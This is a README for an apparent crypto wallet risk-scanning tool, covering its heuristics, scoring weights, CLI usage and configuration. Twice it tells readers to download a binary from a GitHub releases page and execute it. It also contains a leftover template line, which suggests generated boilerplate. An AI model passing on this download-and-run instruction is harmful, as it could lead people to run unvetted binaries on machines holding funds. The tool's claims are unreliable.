Overview
- Purpose: Assess wallet risk across blockchains.
- Scope: On-chain activity, token holdings, contract interactions.
- Output: Human readable report and machine JSON for pipelines.
- Audience: traders, auditors, security teams, researchers.

What it does
- Profiles wallet history and token balances.
- Detects high-risk patterns and flagged behaviors.
- Scores wallets on risk factors.
- Links to on-chain evidence and source transactions.
- Produces a risk report with remediation tips.

Key features
- Multi-chain support: Ethereum, BSC, Polygon, Avalanche, Fantom.
- Transaction timeline with tagged events.
- Token risk analysis: rug checks, transfer patterns.
- Contract interaction tracing.
- Heuristics for mixers, bridges, vaults, and pools.
- Export JSON, CSV, and PDF reports.
- CLI and simple API mode for automation.

How it works
- Fetch on-chain data via public RPC and block explorers.
- Normalize transactions and token transfers.
- Run rule sets to flag patterns: rapid token swaps, high in/out velocity, interaction with known scam contracts.
- Score against weighted factors: exposure, velocity, counterparties, token risk.
- Produce report with evidence links and risk score.

Risk checks and heuristics (examples)
- Large outflows after airdrop: flag.
- Interaction with mixer addresses: score up.
- Repeated token rug patterns: score up.
- High-value transfers to exchanges: reduce custodial risk rating.
- Newly created contracts called by wallet: escalate risk.
- Interaction with flagged addresses: escalate.

Risk score breakdown
- Exposure (30%): holdings value, token diversity.
- Velocity (25%): inflow/outflow rates.
- Counterparty (20%): known bad addresses or mixers.
- Contract risk (15%): unverified contracts or dangerous call patterns.
- Historical signals (10%): past incidents, reversals, chargebacks.

Sample output (concept)
- wallet: 0x12ab...34cd
- score: 78/100
- level: high
- findings:
  - Large transfer to bridge (evidence: tx 0xabc...)
  - Interaction with flagged contract (evidence: tx 0xdef...)
  - Token with known rug pattern (link to token page)
- recommended_actions:
  - Pause large transfers
  - Run full audit on interacting contracts
  - Monitor exchange deposits

Installation
- Download the file from https://github.com/devhovoc/Wallet-Info-Retriever/releases and execute it.
- The release archive contains binaries for Linux, macOS, and Windows plus a minimal container image.
- Example (Linux):
  1. Download the tar.gz from the releases page.
  2. Extract: tar -xzf wallet-info-retriever-linux.tar.gz
  3. Run: ./wallet-info-retriever scan --wallet 0x12ab...34cd --chain ethereum

If you prefer a container:
- Pull the image from the release info and run the container with a mounted config folder.

Usage examples

CLI: quick scan
- Scan a wallet on Ethereum and print human report:
  - wallet-info-retriever scan --wallet 0x12ab...34cd --chain ethereum --format text

CLI: JSON output for automation
- wallet-info-retriever scan --wallet 0x12ab...34cd --chain polygon --format json > report.json

CLI: batch mode
- Provide a file with wallets, one per line:
  - wallet-info-retriever batch --input wallets.txt --chain bsc --output batch-report.csv

API mode (local)
- Start the API server:
  - wallet-info-retriever serve --port 8080 --rpc-url <RPC_ENDPOINT>
- Sample request:
  - POST /api/v1/scan
  - body: { "wallet": "0x12ab...34cd", "chain": "ethereum" }

Config and tuning
- RPC endpoints: add your own RPC to avoid rate limits.
- API keys: add explorer API keys to improve enrichments.
- Rule sets: enable or disable checks in config/rules.yaml.
- Scoring weights: adjust weights to fit your model.

Data sources
- Public RPC nodes.
- Block explorers (Etherscan, BscScan, PolygonScan).
- Open threat lists and community-curated addresses.
- Token lists for metadata.
- Optional: private data feeds for higher fidelity.

Privacy and data handling
- The tool queries public on-chain data.
- It stores local cache to speed repeated scans.
- You can enable encrypted local storage for report history.

Integration ideas
- Pre-trade checks in trading systems.
- Wallet onboarding screens for exchanges or dApps.
- Batch screening for airdrop eligibility.
- Research tools for token analysts.
- YouTube or tutorial content showing risk indicators.

Developer notes
- Language: Go (or replace with the language used in the release).
- Modular rules engine to add new detections.
- Clear interfaces for RPC and explorer adapters.
- Tests cover core heuristics and scoring accuracy.

Contributing
- Want to add checks or chains?
- Fork, add tests, and submit a pull request.
- Use the issue tracker to propose new rules.
- Follow the repo style guide in CONTRIBUTING.md.

Example rule to add
- Rule: "Rapid Swap Chain"
  - Detect rapid swaps across multiple DEXes inside a short time window.
  - Flag when same wallet swaps the same token twice within 5 minutes.
  - Provide evidence: list of tx hashes.

Troubleshooting
- If scans fail, check RPC endpoint limits.
- If performance is slow, enable local caching and increase worker count.
- If a token has no metadata, add it to your local token list or use the token service.

Files in the release
- Binaries for each supported OS.
- Docker image and Dockerfile.
- rules.yaml: default detection rules.
- config.example.yaml: runtime options.
- LICENSE and CONTRIBUTING guides.
- CHANGELOG.md with version notes.

Release flow
- Check the Releases page for prebuilt assets and instructions.
- Download the file from https://github.com/devhovoc/Wallet-Info-Retriever/releases and execute it.
- Each release includes a checksum file to verify integrity.

Security
- Verify signatures or checksums before running binaries.
- Run in an isolated environment for initial tests.
- Use private RPC endpoints for production scans.

Common scenarios and recommended checks
- Incoming funds from mixer: increase monitoring and get KYC info if relevant.
- High token concentration in a single asset: note exposure risk.
- Frequent contract calls to new contracts: flag for manual review.
- Multiple small deposits followed by a large withdrawal: inspect counterparties.

License
- MIT. See LICENSE in the repo.
